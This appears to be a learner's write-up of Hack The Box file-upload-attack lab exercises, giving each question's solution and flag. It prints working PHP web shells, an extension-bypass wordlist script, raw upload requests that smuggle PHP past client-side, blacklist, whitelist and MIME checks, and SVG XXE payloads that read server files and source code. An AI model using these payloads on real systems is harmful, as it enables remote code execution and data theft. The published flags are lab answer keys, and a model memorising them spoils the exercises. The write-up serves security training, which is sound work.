@@ -1,0 +1,601 @@
+[Absent Validation]
+
+[*] Target: 209.97.131.137:32596 
+
+[Question 1]  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
+
+    [Step 1] Create our payload 
+
+        # echo '<?php system(hostname);?>' >> test.php 
+
+    [Step 2] Upload then find out the directory that stores our file
+
+        # ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://209.97.131.137:32596/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+            v1.4.1-dev
+        ________________________________________________
+
+        :: Method           : GET
+        :: URL              : http://209.97.131.137:32596/FUZZ
+        :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+        :: Follow redirects : false
+        :: Calibration      : false
+        :: Timeout          : 10
+        :: Threads          : 40
+        :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+        ________________________________________________
+
+        uploads                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 38ms]
+                                [Status: 200, Size: 679, Words: 77, Lines: 24, Duration: 884ms]
+        :: Progress: [87664/87664] :: Job [1/1] :: 8973 req/sec :: Duration: [0:02:50] :: Errors: 113 ::
+
+        => http://209.97.131.137:32596/uploads/test.php => "ng-788964-fileuploadsabsentverification-u5xfa-6dbf994d78-c994s"
+
+    [!] Answer: "fileuploadsabsentverification"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Upload Exploitation]
+
+[*] Target: 209.97.131.137:32596
+
+[Question 1] Try to exploit the upload feature to upload a web shell and get the content of /flag.txt
+
+    [Step 1] Create our payload 
+
+        # echo '<?php system($_REQUEST['cmd']); ?>' >> shell.php
+
+    [Step 2] Upload then read our /flag.txt
+
+        - http://209.97.131.137:32596/uploads/shell.php?cmd=cat%20/flag.txt => HTB{g07_my_f1r57_w3b_5h3ll}
+
+    [!] Answer: "HTB{g07_my_f1r57_w3b_5h3ll}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Client-Side Validation]
+
+[*] Target: 144.126.230.157:30069
+
+[Question 1] Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
+
+[Step 1] Create our payload
+ 
+  # echo '<?php system($_REQUEST['cmd']); ?>' >> malware_1.php
+  # echo '<?php system($_REQUEST['cmd']); ?>' >> malware_2.php
+
+[Step 2] Bypass the Client-Side Validation and read the flag
+
+    [1st Way] Find out the filter in the web's source code
+
+        <h1>Update your profile image</h1>
+            <center>
+            <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
+                <input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
+                <img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>
+                <input type="submit" value="Upload" id="submit">
+            </form>
+
+        => See this onSubmit="if(validate()){upload()}" => onSubmit="upload()"
+
+        - Upload malware_1.php
+
+        => http://209.97.131.137:32287/profile_images/malware_1.php?cmd=cat%20/flag.txt => HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
+
+        (Note: You are thinking "How can I know the directory that stores the payload" => "<img src='/profile_images/default.jpg' class='profile-image' id='profile-image'>")
+    
+
+    [2nd Way] Upload a real image and change its content using Burpsuite
+
+        POST /upload.php HTTP/1.1
+        Host: 209.97.131.137:32287
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------12932795602865654624714110845
+        Content-Length: 3933583
+        Origin: http://209.97.131.137:32287
+        Connection: close
+        Referer: http://209.97.131.137:32287/
+
+        -----------------------------12932795602865654624714110845
+        Content-Disposition: form-data; name="uploadFile"; filename="CBBH.png"
+        Content-Type: image/png
+
+        PNG
+
+        blah..blah...etc..etc..
+
+        -----------------------------12932795602865654624714110845--
+
+        => Change the data to this
+
+        POST /upload.php HTTP/1.1
+        Host: 209.97.131.137:32287
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------3195327427299931795266919385
+        Content-Length: 3933583
+        Origin: http://209.97.131.137:32287
+        Connection: close
+        Referer: http://209.97.131.137:32287/
+        Upgrade-Insecure-Requests: 1
+
+        -----------------------------3195327427299931795266919385
+        Content-Disposition: form-data; name="uploadFile"; filename="malware_2.php"
+        Content-Type: application/x-php
+
+        <?php system($_REQUEST[cmd]); ?>
+
+        -----------------------------3195327427299931795266919385--
+
+        => http://209.97.131.137:32287/profile_images/malware_2.php?cmd=cat%20/flag.txt => HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
+
+    [!] Answer: "HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Blacklist Filters]
+
+[*] Target: 178.62.9.40:30218
+
+[Question 1] Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"
+
+    [Step 1] Create our payload & wordlist
+        
+        # echo '<?php system('cat /flag.txt'); ?>' >> CBBH.jpg
+
+        (Note: you can change .jpg -> .php in burpsuite later)
+
+        # Put the code below into a ".sh" file and run it, you will have your Bypass_extension.txt
+
+        for main_exten in 'jpg' 'png' 'gif'; do
+            for char in '%20' '%0a' '%00' '%0d0a' '\x00' '%09' '/' '.\\' '.' '…' ':' '#'; do
+                for ext in 'php' 'phps' 'php3' 'php4' 'php5' 'php7' 'php8' 'phar' 'phtml' 'phtm' 'pHtml' 'pHp' 'pHp3' 'pHp4' 'pHp5' 'phpt' 'htaccess' 'shtml' 'hphp' 'inc'; do
+                    echo "$char.$ext.$main_exten" >> Bypass_extension.txt
+                    echo ".$ext$char.$main_exten" >> Bypass_extension.txt
+                    echo ".$main_exten$char.$ext" >> Bypass_extension.txt
+                    echo ".$main_exten.$ext$char" >> Bypass_extension.txt
+                    echo ".$main_exten.$ext" >> Bypass_extension.txt
+                    echo ".$ext.$main_exten" >> Bypass_extension.txt
+                    echo ".$ext" >> Bypass_extension.txt
+                    echo ".$ext.$ext.$main_exten" >> Bypass_extension.txt
+                done
+            done
+        done
+
+    [Step 2] Upload all possible php extension
+
+        POST /upload.php HTTP/1.1
+        Host: 134.122.99.24:31938
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------368445612913202171332829995292
+        Content-Length: 259
+        Origin: http://134.122.99.24:31938
+        Connection: close
+        Referer: http://134.122.99.24:31938/
+
+        -----------------------------368445612913202171332829995292
+        Content-Disposition: form-data; name="uploadFile"; filename="CBBH.§jpg§"
+        Content-Type: image/jpeg
+
+        <?php system('cat /flag.txt'); ?>
+        -----------------------------368445612913202171332829995292--
+
+    [Step 3] After uploaded all of them I will check if any of them give me the output I want 
+
+        GET /profile_images/CBBH.§jpg§ HTTP/1.1
+        Host: 134.122.99.24:31938
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    => http://134.122.99.24:31938/profile_images/CBBH.phar => HTB{1_c4n_n3v3r_b3_bl4ckl1573d} 
+
+    [!] Answer: "HTB{1_c4n_n3v3r_b3_bl4ckl1573d}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Whitelist Filters]
+
+[*] Target: 209.97.131.137:32609
+
+[Question 1] The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
+
+    [Step 1] Create our payload
+
+        # echo '<?php system('cat /flag.txt'); ?>' >> Anon.jpg
+
+        (Note: I will use the wordlist in the previous question)
+
+    [Step 2] Fuzz the file extension until it done
+
+        POST /upload.php HTTP/1.1
+        Host: 209.97.131.137:32609
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------6602845714098516412540023190
+        Content-Length: 254
+        Origin: http://209.97.131.137:32609
+        Connection: close
+        Referer: http://209.97.131.137:32609/
+
+        -----------------------------6602845714098516412540023190
+        Content-Disposition: form-data; name="uploadFile"; filename="Anon§.jpg§"
+        Content-Type: image/jpeg
+
+        <?php system('cat /flag.txt'); ?>
+        -----------------------------6602845714098516412540023190--
+
+        [Super important] YOU NEED TO TURN OFF "Payload Encoding" IN THE Intruder > Payload > Payload Encoding OR THE FILE NAME YOU SENT WILL LOOK LIKE "None%2ejpg%2ephar"
+
+        - Oke there are many accepted files so we need to fuzz the output too, just like in the blacklist section
+        
+        GET /profile_images/Anon§.random§ HTTP/1.1
+        Host: 209.97.131.137:32609
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        => You will see tons of responses that give you the flag (Lenght = 191) =>  HTB{1_wh173l157_my53lf}
+
+        /profile_images/Anon%2ephtmlâ¦%2ejpg 
+        /profile_images/Anon%2ephar%23%2ejpg
+        /profile_images/Anon%2ephar%2ephar%2ejpg
+        /profile_images/Anon%2ephar%2ejpg
+        /profile_images/Anon%2ephar%2ephar%2ejpg 
+        ....etc..etc...
+
+    [!] Answer: "HTB{1_wh173l157_my53lf}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Type Filters]
+
+[*] Target: 165.232.110.46:30371
+
+[Question 1] The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. 
+             Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
+
+    [Step 1] Upload the "image" in this case I add 'ÿØÿá' for ",jpg" file
+
+            POST /upload.php HTTP/1.1
+            Host: 165.232.110.46:30371
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            X-Requested-With: XMLHttpRequest
+            Content-Type: multipart/form-data; boundary=---------------------------183645179514778166312936176832
+            Content-Length: 267
+            Origin: http://165.232.110.46:30371
+            Connection: close
+            Referer: http://165.232.110.46:30371/
+
+            -----------------------------183645179514778166312936176832
+            Content-Disposition: form-data; name="uploadFile"; filename="Anon§.jpg§"
+            Content-Type: image/jpeg
+
+            ÿØÿá
+
+            <?php system('cat /flag.txt'); ?>
+
+            -----------------------------183645179514778166312936176832--
+
+            => There are many extensions are accepted
+
+    [Step 2] Fuzz to find the output
+
+            GET /profile_images/Anon§.ex§ HTTP/1.1
+            Host: 165.232.110.46:30371
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+
+            =>  /profile_images/Anon%2ejpg%2ephar
+                /profile_images/Anon%2ejpg%2ephtml
+                /profile_images/Anon%2ejpg%2ephar 
+                /profile_images/Anon%2ejpg%23%2ephar
+                ....
+
+            All of them contain the flag => HTB{m461c4l_c0n73n7_3xpl0174710n}
+
+    [!] Answer: "HTB{m461c4l_c0n73n7_3xpl0174710n}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Limited File Uploads]
+
+[*] Target: 178.62.76.153:30154
+
+[Question 1] The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
+
+    - As you already know SVG is an XML-based format that describes two-dimensional vector graphics using a set of drawing instructions and shapes.
+
+    => When you go to http://178.62.76.153:30154/ , you will see the HTB logo. Of course, you can upload to change the logo (https://upload.wikimedia.org/wikipedia/commons/b/b0/NewTux.svg)
+
+    => As you can see, it's the mathematic stuff, I don't understand, but I know the backend executes these XML codes to show us the image
+
+    - So instead of using XML for creating images, you can use the XML to read the back-end's file
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
+        <svg>&xxe;</svg>
+
+    => This website accepts svg so, just upload it normally, and remember "Do not change the Content-Type and Extension of svg file event when trying to bypass"
+        
+        POST /upload.php HTTP/1.1
+        Host: 178.62.76.153:30154
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=---------------------------69285911818240904021932184157
+        Content-Length: 350
+        Origin: http://178.62.76.153:30154
+        Connection: close
+        Referer: http://178.62.76.153:30154/
+
+        -----------------------------69285911818240904021932184157
+        Content-Disposition: form-data; name="uploadFile"; filename="Flag_Searcher.svg"
+        Content-Type: image/svg+xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE svg [ <!ENTITY thinhdeptraiprovip SYSTEM "file:///flag.txt"> ]>
+        <svg>&thinhdeptraiprovip;</svg>
+        -----------------------------69285911818240904021932184157--
+
+    => Now you can see the uploaded image 
+
+        <center>
+            <form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm">
+                <input type="file" name="uploadFile" id="uploadFile" accept=".svg">
+                <svg>HTB{my_1m4635_4r3_l37h4l}</svg>        
+                <input type="submit" value="Upload" id="submit">
+            </form>
+        </center>
+
+    [!] Answer: "HTB{my_1m4635_4r3_l37h4l}"
+
+[Question 2]  Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
+
+    - Now we have the mindset from the previous question, but this time, I need to read the upload.php's source code, so the payload must be a little bit different
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE svg [ <!ENTITY thinhdeptraiprovip SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+    <svg>&thinhdeptraiprovip;</svg>
+
+    [?] 'php://filter' stream allows you to apply filters to the resource being accessed, in this case, converting it to Base64. This is a trick to transfer things much more easier
+
+    -> After uploaded the payload you will retrive this => 'PD9waHAK...b2FkIjsKfQo=' which can be decode to
+
+        <?php
+        $target_dir = "./images/";
+        $fileName = basename($_FILES["uploadFile"]["name"]);
+        $target_file = $target_dir . $fileName;
+        $contentType = $_FILES['uploadFile']['type'];
+        $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+        if (!preg_match('/^.*\.svg$/', $fileName)) {
+            echo "Only SVG images are allowed";
+            die();}
+
+        if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+            $latest = fopen($target_dir . "latest.xml", "w");
+            fwrite($latest, basename($_FILES["uploadFile"]["name"]));
+            fclose($latest);
+            echo "File successfully uploaded";
+        } else {
+            echo "File failed to upload";}
+
+    [!] Answer: "./images/"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment - File Upload Attacks]
+
+[*] Target: 178.62.76.153:32754
+
+[Question 1] Try to exploit the upload form to read the flag found at the root directory "/".
+
+    -  Go to http://178.62.76.153:32754/contact/ and submit the required information
+
+            GET /contact/submit.php?Name=Hung+Thinh+Tran&Email=thinh%40gmail.com&Message=something+blah+could+true&uploadFile=CBBH.png HTTP/1.1
+            Host: 178.62.76.153:32754
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Referer: http://178.62.76.153:32754/contact/
+            Upgrade-Insecure-Requests: 1
+
+    => Nah! it doesn't look like something we can use, like try another Way
+
+    - I just uploaded TryHackMe.jpg (just a normal image) and then click on the green button, after that it show me the image I uploaded
+
+            POST /contact/upload.php HTTP/1.1
+            Host: 178.62.76.153:32754
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            X-Requested-With: XMLHttpRequest
+            Content-Type: multipart/form-data; boundary=---------------------------341652058316666980881481951371
+            Content-Length: 216245
+            Origin: http://178.62.76.153:32754
+            Connection: close
+            Referer: http://178.62.76.153:32754/contact/
+
+            -----------------------------341652058316666980881481951371
+            Content-Disposition: form-data; name="uploadFile"; filename="TryHackMe.jpg"
+            Content-Type: image/jpeg
+
+            ÿØÿà
+            blah...blah...
+            -----------------------------341652058316666980881481951371--
+
+    => Time to upload the malware
+
+            POST /contact/upload.php HTTP/1.1
+            Host: 178.62.76.153:32754
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            X-Requested-With: XMLHttpRequest
+            Content-Type: multipart/form-data; boundary=---------------------------59267271734990747623838074156
+            Content-Length: 275
+            Origin: http://178.62.76.153:32754
+            Connection: close
+            Referer: http://178.62.76.153:32754/contact/
+
+            -----------------------------59267271734990747623838074156
+            Content-Disposition: form-data; name="uploadFile"; filename="Exploit_Img§.jpg§"
+            Content-Type: image/jpeg
+
+            ÿØÿà.
+            <?php system($_REQUEST['cmd']); ?>
+            -----------------------------59267271734990747623838074156--
+
+    => Oke! There are many malware are uploaded, next, we need to know where they were uploaded by reading the source of upload.php
+
+            POST /contact/upload.php HTTP/1.1
+            Host: 178.62.76.153:32754
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            X-Requested-With: XMLHttpRequest
+            Content-Type: multipart/form-data; boundary=---------------------------3078933945718555391137198549
+            Content-Length: 416
+            Origin: http://178.62.76.153:32754
+            Connection: close
+            Referer: http://178.62.76.153:32754/contact/
+
+            -----------------------------3078933945718555391137198549
+            Content-Disposition: form-data; name="uploadFile"; filename="Flag_Searcher.svg"
+            Content-Type: image/svg+xml
+
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE svg [ <!ENTITY thinhdeptraiprovip SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
+            <svg>&thinhdeptraiprovip;</svg>
+            -----------------------------3078933945718555391137198549--
+
+        (Note: you can change the file extension to ".jpg" to bypass the client-side filter then change it again burpsuite)
+        
+            HTTP/1.1 200 OK
+            Date: Sat, 27 May 2023 04:16:19 GMT
+            Server: Apache/2.4.41 (Ubuntu)
+            Vary: Accept-Encoding
+            Content-Length: 1443
+            Connection: close
+            Content-Type: text/html; charset=UTF-8    
+                
+            <svg>PD9..Cn0K</svg>
+
+        => 'PD9..Cn0K' which can be decoded to
+
+            <?php
+            require_once('./common-functions.php');
+
+            // uploaded files directory
+            $target_dir = "./user_feedback_submissions/";
+
+            // rename before storing
+            $fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
+            $target_file = $target_dir . $fileName;
+
+            // get content headers
+            $contentType = $_FILES['uploadFile']['type'];
+            $MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+            // blacklist test
+            if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
+                echo "Extension not allowed";
+                die();}
+
+            // whitelist test
+            if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
+                echo "Only images are allowed";
+                die();}
+
+            // type test
+            foreach (array($contentType, $MIMEtype) as $type) {
+                if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
+                    echo "Only images are allowed";
+                    die();}}
+
+            // size test
+            if ($_FILES["uploadFile"]["size"] > 500000) {
+                echo "File too large";
+                die();
+            }
+
+            if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+                displayHTMLImage($target_file);
+            } else {
+                echo "File failed to upload";}
+
+        => Now we know that our files are stored as 230527_Exploit_Img.[extensions] in the /user_feedback_submissions. We need to fuzz the file extension to know what is the available one
+
+            GET /contact/user_feedback_submissions/230527_Exploit_Img§.jpg§?cmd=whoami HTTP/1.1
+            Host: 178.62.76.153:32754
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=whoami => www.data
+
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=ls / => ... flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
+
+        => http://178.62.76.153:32754/contact/user_feedback_submissions/230527_Exploit_Img.phar.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt => HTB{m4573r1ng_upl04d_3xpl0174710n}
+
+    [!] Answer: "HTB{m4573r1ng_upl04d_3xpl0174710n}"
+
+
